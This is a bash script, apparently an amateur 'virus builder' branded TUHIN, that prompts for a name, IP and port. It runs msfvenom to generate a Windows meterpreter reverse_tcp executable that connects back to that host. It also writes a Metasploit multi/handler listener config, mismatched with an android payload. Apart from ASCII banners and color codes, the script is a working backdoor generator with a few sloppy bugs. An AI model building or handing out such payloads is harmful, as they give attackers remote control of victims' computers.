#!/usr/bin/env bash
### data ##
# color code #
## formatting ##
bold='\e[1m'
dim='\e[2m'
underline='e[4m'
blink='\e[5m'
reverse='\e[7m'
hidden='\e[8m'
## reset formatting ##
resetall='\e[0m'
resetbold='\e[21m'
resetdim='\e[22m'
resetunderline='\e[24m'
resetblink='\e[25m'
resetreverse='\e[27m'
resethidden='\e[28m'
## color code ##
default='\e[39m'
black='\e[30m'
red='\e[31m'
green='\e[32m'
yellow='\e[33m'
blue='\e[34m'
magenta='\e[35m'
cyan='\e[36m'
white='\e[97m'
## light color ##
lightgray='\e[37m'
darkgray='\e[90m'
lightred='\e[91m'
lightgreen='\e[92m'
lightyellow='\e[93m'
lightblue='\e[94m'
lightmagenta='\e[95m'
lightcyan='\e[96m'
# end #
function getname() {
  printf "${green}Set virus name /=>${red} "
  read vname
}
function gethost() {
  printf "${green}Set ip-address /=>${red} "
  read vip
}
function getport() {
  printf "${green}Set port /=>${red} "
  read vport
}
function getou() {
  printf "${green}Set about command /=>${red} "
  read vou
}
function banar() {
  clear
  echo -e '#############################################################################'
  echo -e '#############################################################################'
  echo -e ${red}'
                     ,#%%*             .(##%(.
                      (%%%.           .((*            /#%%#
                     /(#%%%           .((*            ((#%#
                      /(#(            .((*             (((
                      /(#(            .((*             (((
                      /(((*           .((*      /(((((((((
                        /((#(         ,((*      *((.
                          .((((/(((((((((((((((((((.
                       ,,%&%#(##%&@@@@@@@@@@@@@&%#((#%&*,
                    (&&&%(((&@@@@@@%#((#%%%%%&@@@@@@%((#&&&%
                ,%&&&&%((%@@@@&#(((((#%%%%%%%%%%%&@@@@&#(#&&&&&/*
             /&&&&&&&#(#@@@@#(#%%%%%&&&&&&&&%%%%%%%%&@@@&((%&&&&&&#
          ,%&&&&&&&&#(%@@@@%%%%%%%%&&&%#(#%%%%%%#((((#@@@@((%&&&&&&&%#*
        /&&&&&&&&&&#(#@@@@&&%%%%%%%(********/(%%%%#(((#@@@&((%&&&&&&&&&&(.
     .#%%&&&&&&&&&%#(&@@@&&&&%%%%#************(%&%%%(((%@@@#(#&&&&&&&&&&&&&*
    .%%%%%%&&&&&&&%#(&@@@&&&&&&%%#************/%&&&%%((%@@@%(#&&&&&&&&&&&%%/.
     .#%%%%%%%&&&&&#(&@@@&&&&&&&&#************(%&&&&%#(&@@@#(#&&&&&&&&%%%#,
        *%%%%%%%%&&#(#&@@@&&&&&&&&&%(******/(%&&&&&&&#%@@@%((&&&&&&%%%%/.
           .#%%%%%%%#(#&@@@&&&&&&&&&&&&%%%%%%&&&&&&&&&@@@&((%&&&%%%%#,
              /%%%%%%#((&@@@@%%%%%%%%%%%%%%%&&&&&&&&@@@@#((&%%%%%(
                 ,#%%%##(#&@@@@&&%%%%%%%%%&&&&&&&@@@@@%((#%%%#*,
                     (#%%#((#&@@@@@@@&&&&&@@@@@@@@@%(((#%%#
                         ,,%#(((#%&&@@@@@@@@@&%##((#%*,,
                             (((//(((((((((((((/.*((((.
                             (((      .((*          (#(((
                      /#((((((((      .((*            ,(((
                      /(#(            .((*             (((
                      /###            .((*             (##
                     /##%%%           .((*            (#%%#
                      ./(.            ,##*             ((,.
                                     .(#%%%*
'
echo -e ${resetall}
echo -e ${blue}'#############################################################################'
echo -e ${green}'#############################################################################'
echo -e ${yellow}'###                                 '${blink}'TUHIN'${resetblink}'                                 ### '
echo -e ${green}'#############################################################################'
echo -e ${blue}'#############################################################################'
}
function setfiles() {
  mkdir $vname
  cd $vname
}
function settxtfiles() {

  echo "msfconsole" >> $vname.txt
  echo "use exploit/multi/handler" >> $vname.txt
  echo "set payload android/meterpreter/reverse_tcp" >> $vname.txt
  echo "set lhost 0.0.0.0" >> $vname.txt
  echo "set lport $vport" >> $vname.txt
  echo "exploit" >> $vname.txt
  echo " " >> $vname.txt


}
function com() {
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$vip LPORT=$vport $ou -f exe > $vname.exe
}
function con() {
  if [[ -z $vname ]]; then
    echo 'please enter virus name'
    getname
    con
  elif [[ -z $vip ]]; then
    echo 'please enter ip-address name'
    gethost
    con
  elif [[ -z $vport ]]; then
    echo 'please enter virus name'
    getport
    con
  elif [[ -d $vname ]]; then
        echo -e ${red} "$vname is not available try outher name"
        getname
        con
  else
    setfiles
    com
    settxtfiles
    banar
    echo -e ${lightblue}'#############################################################################'
    echo -e ${lightblue}'#############################################################################'
    echo -e ${yellow}'###                                '${blink}'COMPLETE'${resetblink}'                               ### '
    echo -e ${lightblue}'#############################################################################'
    echo -e ${lightblue}'#############################################################################'
  fi
}
clear
banar
getname
gethost
getport
getou
con
echo -e ${resetallS}
